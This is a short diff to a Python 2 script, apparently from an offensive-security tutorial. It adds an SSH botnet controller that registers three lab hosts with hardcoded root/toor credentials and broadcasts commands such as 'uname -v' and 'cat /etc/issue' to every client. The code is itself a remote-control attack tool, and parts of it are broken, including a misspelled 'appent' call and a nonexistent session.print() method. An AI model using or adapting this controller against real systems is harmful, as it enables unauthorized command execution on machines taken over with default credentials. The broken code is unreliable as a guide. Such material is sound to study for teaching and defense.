@@ -22,9 +22,30 @@ class Client:
 			print '[-] Error Connecting'
 
 def send_command(self, cmd):
+
 	self.session.sendline(cmd)
 	self.session.print()
 	return self.session.before
+
+def botnetCommand(command):
+
+	for client in botNet:
+		output = client.send_command(command)
+		print '[*] Output from ' + client.host
+		print '[+] ' + output + '\n'
+
+def addClient(host, user, password):
+	client = Client(host, user, password)
+	botNet.appent(client)
+
+botNet = []
+addClient('10.10.10.110', 'root', 'toor')
+addClient('10.10.10.120', 'root', 'toor')
+addClient('10.10.10.130', 'root', 'toor')
+botnetCommand('uname -v')
+botnetCommand('cat /etc/issue')
+
+
 
 
 
